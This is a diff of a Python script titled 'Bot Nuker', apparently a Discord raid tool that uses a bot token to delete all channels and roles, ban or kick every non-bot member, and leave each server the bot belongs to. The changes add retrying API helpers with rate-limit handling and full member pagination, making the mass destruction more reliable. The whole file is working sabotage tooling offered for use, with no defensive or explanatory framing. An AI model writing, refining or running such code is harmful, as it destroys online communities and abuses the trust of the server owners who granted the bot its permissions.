@@ -16,7 +16,6 @@ except Exception as e:
     MissingModule(e)
 
 Title("Bot Nuker")
-Connection()
 
 Scroll(GradientBanner(discord_banner))
 
@@ -44,13 +43,145 @@ try:
     except:
         delay = 0.5
 
-    headers = {"Authorization": f"Bot {bot_token}", "Content-Type": "application/json", "User-Agent": RandomUserAgents()}
+    headers = {
+        "Authorization": f"Bot {bot_token}",
+        "Content-Type" : "application/json",
+        "User-Agent"   : RandomUserAgents(),
+    }
+
+    def ApiGet(url):
+        while True:
+            try:
+                r = requests.get(url, headers=headers, timeout=10)
+                if r.status_code == 429:
+                    time.sleep(r.json().get("retry_after", 1))
+                    continue
+                return r
+            except Exception:
+                return None
+
+    def ApiDelete(url):
+        while True:
+            try:
+                r = requests.delete(url, headers=headers, timeout=10)
+                if r.status_code == 429:
+                    time.sleep(r.json().get("retry_after", 1))
+                    continue
+                return r
+            except Exception:
+                return None
+
+    def ApiPut(url, json=None):
+        while True:
+            try:
+                r = requests.put(url, headers=headers, json=json or {}, timeout=10)
+                if r.status_code == 429:
+                    time.sleep(r.json().get("retry_after", 1))
+                    continue
+                return r
+            except Exception:
+                return None
+
+    def FetchAllMembers(guild_id):
+        members = []
+        after   = 0
+        while True:
+            r = ApiGet(f"https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000&after={after}")
+            if not r or r.status_code != 200:
+                break
+            batch = r.json()
+            if not batch:
+                break
+            members.extend(batch)
+            after = int(batch[-1]["user"]["id"])
+            if len(batch) < 1000:
+                break
+            time.sleep(0.5)
+        return members
+
+    def DeleteChannels(guild_id, guild_name):
+        r = ApiGet(f"https://discord.com/api/v9/guilds/{guild_id}/channels")
+        if not r or r.status_code != 200:
+            print(f"{ERROR} Cannot fetch channels | Server:{red} {guild_name}", reset)
+            return
+        for channel in r.json():
+            channel_id   = channel["id"]
+            channel_name = channel.get("name", "None")
+            resp         = ApiDelete(f"https://discord.com/api/v9/channels/{channel_id}")
+            if resp and resp.status_code == 200:
+                print(f"{SUCCESS} Deleted channel:{red} {channel_name}{white} | Server:{red} {guild_name}", reset)
+            else:
+                code = resp.status_code if resp else "None"
+                print(f"{ERROR} Failed channel:{red} {channel_name}{white} | Code:{red} {code}", reset)
+            time.sleep(delay)
+
+    def BanMembers(guild_id, guild_name):
+        members = FetchAllMembers(guild_id)
+        if not members:
+            print(f"{ERROR} Cannot fetch members | Server:{red} {guild_name}", reset)
+            return
+        for member in members:
+            if member["user"].get("bot"):
+                continue
+            user_id  = member["user"]["id"]
+            username = member["user"].get("username", "None")
+            resp     = ApiPut(f"https://discord.com/api/v9/guilds/{guild_id}/bans/{user_id}", json={"delete_message_seconds": 0})
+            if resp and resp.status_code == 204:
+                print(f"{SUCCESS} Banned:{red} {username}{white} | Server:{red} {guild_name}", reset)
+            else:
+                code = resp.status_code if resp else "None"
+                print(f"{ERROR} Failed:{red} {username}{white} | Code:{red} {code}", reset)
+            time.sleep(delay)
+
+    def KickMembers(guild_id, guild_name):
+        members = FetchAllMembers(guild_id)
+        if not members:
+            print(f"{ERROR} Cannot fetch members | Server:{red} {guild_name}", reset)
+            return
+        for member in members:
+            if member["user"].get("bot"):
+                continue
+            user_id  = member["user"]["id"]
+            username = member["user"].get("username", "None")
+            resp     = ApiDelete(f"https://discord.com/api/v9/guilds/{guild_id}/members/{user_id}")
+            if resp and resp.status_code == 204:
+                print(f"{SUCCESS} Kicked:{red} {username}{white} | Server:{red} {guild_name}", reset)
+            else:
+                code = resp.status_code if resp else "None"
+                print(f"{ERROR} Failed:{red} {username}{white} | Code:{red} {code}", reset)
+            time.sleep(delay)
+
+    def DeleteRoles(guild_id, guild_name):
+        r = ApiGet(f"https://discord.com/api/v9/guilds/{guild_id}/roles")
+        if not r or r.status_code != 200:
+            print(f"{ERROR} Cannot fetch roles | Server:{red} {guild_name}", reset)
+            return
+        for role in r.json():
+            if role.get("managed") or role.get("name") == "@everyone":
+                continue
+            role_id   = role["id"]
+            role_name = role.get("name", "None")
+            resp      = ApiDelete(f"https://discord.com/api/v9/guilds/{guild_id}/roles/{role_id}")
+            if resp and resp.status_code == 204:
+                print(f"{SUCCESS} Deleted role:{red} {role_name}{white} | Server:{red} {guild_name}", reset)
+            else:
+                code = resp.status_code if resp else "None"
+                print(f"{ERROR} Failed role:{red} {role_name}{white} | Code:{red} {code}", reset)
+            time.sleep(delay)
+
+    def LeaveServer(guild_id, guild_name):
+        resp = ApiDelete(f"https://discord.com/api/v9/users/@me/guilds/{guild_id}")
+        if resp and resp.status_code == 204:
+            print(f"{SUCCESS} Left server:{red} {guild_name}", reset)
+        else:
+            code = resp.status_code if resp else "None"
+            print(f"{ERROR} Failed to leave:{red} {guild_name}{white} | Code:{red} {code}", reset)
 
     print(f"{LOADING} Fetching servers..", reset)
 
-    guilds_response = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers)
+    guilds_response = ApiGet("https://discord.com/api/v9/users/@me/guilds")
 
-    if guilds_response.status_code != 200:
+    if not guilds_response or guilds_response.status_code != 200:
         print(f"{ERROR} Could not fetch servers!", reset)
         Continue()
         Reset()
@@ -64,84 +195,11 @@ try:
 
     print(f"{SUCCESS} Found:{red} {len(guilds)}{white} server(s)", reset)
 
-    def DeleteChannels(guild_id, guild_name):
-        channels_response = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers)
-        if channels_response.status_code != 200:
-            print(f"{ERROR} Status:{red} Failed  {white}| Server:{red} {guild_name}{white} | Error:{red} Cannot fetch channels", reset)
-            return
-        channels = channels_response.json()
-        for channel in channels:
-            channel_id   = channel["id"]
-            channel_name = channel.get("name", "Unknown")
-            response     = requests.delete(f"https://discord.com/api/v9/channels/{channel_id}", headers=headers)
-            if response.status_code == 200:
-                print(f"{SUCCESS} Status:{red} Deleted {white}| Channel:{red} {channel_name}{white} | Server:{red} {guild_name}", reset)
-            else:
-                print(f"{ERROR} Status:{red} Failed  {white}| Channel:{red} {channel_name}{white} | Code:{red} {response.status_code}", reset)
-            time.sleep(delay)
-
-    def BanMembers(guild_id, guild_name):
-        members_response = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000", headers=headers)
-        if members_response.status_code != 200:
-            print(f"{ERROR} Status:{red} Failed  {white}| Server:{red} {guild_name}{white} | Error:{red} Cannot fetch members", reset)
-            return
-        members = members_response.json()
-        for member in members:
-            user_id  = member["user"]["id"]
-            username = member["user"].get("username", "Unknown")
-            response = requests.put(f"https://discord.com/api/v9/guilds/{guild_id}/bans/{user_id}", headers=headers)
-            if response.status_code == 204:
-                print(f"{SUCCESS} Status:{red} Banned  {white}| User:{red} {username}{white} | Server:{red} {guild_name}", reset)
-            else:
-                print(f"{ERROR} Status:{red} Failed  {white}| User:{red} {username}{white} | Code:{red} {response.status_code}", reset)
-            time.sleep(delay)
-
-    def KickMembers(guild_id, guild_name):
-        members_response = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000", headers=headers)
-        if members_response.status_code != 200:
-            print(f"{ERROR} Status:{red} Failed  {white}| Server:{red} {guild_name}{white} | Error:{red} Cannot fetch members", reset)
-            return
-        members = members_response.json()
-        for member in members:
-            user_id  = member["user"]["id"]
-            username = member["user"].get("username", "Unknown")
-            response = requests.delete(f"https://discord.com/api/v9/guilds/{guild_id}/members/{user_id}", headers=headers)
-            if response.status_code == 204:
-                print(f"{SUCCESS} Status:{red} Kicked  {white}| User:{red} {username}{white} | Server:{red} {guild_name}", reset)
-            else:
-                print(f"{ERROR} Status:{red} Failed  {white}| User:{red} {username}{white} | Code:{red} {response.status_code}", reset)
-            time.sleep(delay)
-
-    def DeleteRoles(guild_id, guild_name):
-        roles_response = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/roles", headers=headers)
-        if roles_response.status_code != 200:
-            print(f"{ERROR} Status:{red} Failed  {white}| Server:{red} {guild_name}{white} | Error:{red} Cannot fetch roles", reset)
-            return
-        roles = roles_response.json()
-        for role in roles:
-            role_id   = role["id"]
-            role_name = role.get("name", "Unknown")
-            if role.get("managed") or role_name == "@everyone":
-                continue
-            response = requests.delete(f"https://discord.com/api/v9/guilds/{guild_id}/roles/{role_id}", headers=headers)
-            if response.status_code == 204:
-                print(f"{SUCCESS} Status:{red} Deleted {white}| Role:{red} {role_name}{white} | Server:{red} {guild_name}", reset)
-            else:
-                print(f"{ERROR} Status:{red} Failed  {white}| Role:{red} {role_name}{white} | Code:{red} {response.status_code}", reset)
-            time.sleep(delay)
-
-    def LeaveServer(guild_id, guild_name):
-        response = requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{guild_id}", headers=headers)
-        if response.status_code == 204:
-            print(f"{SUCCESS} Status:{red} Left    {white}| Server:{red} {guild_name}", reset)
-        else:
-            print(f"{ERROR} Status:{red} Failed  {white}| Server:{red} {guild_name}{white} | Code:{red} {response.status_code}", reset)
-
     for guild in guilds:
         guild_id   = guild["id"]
-        guild_name = guild.get("name", "Unknown")
+        guild_name = guild.get("name", "None")
 
-        print(f"{INFO} Processing:{red} {guild_name}", reset)
+        print(f"\n{INFO} Processing:{red} {guild_name}", reset)
 
         if choice == "1":
             DeleteChannels(guild_id, guild_name)
@@ -155,14 +213,11 @@ try:
             LeaveServer(guild_id, guild_name)
         elif choice == "6":
             DeleteChannels(guild_id, guild_name)
-            time.sleep(delay)
             DeleteRoles(guild_id, guild_name)
-            time.sleep(delay)
             BanMembers(guild_id, guild_name)
-            time.sleep(delay)
             LeaveServer(guild_id, guild_name)
 
-    print(f"{SUCCESS} Completed!", reset)
+    print(f"\n{SUCCESS} Completed!", reset)
 
     Continue()
     Reset()
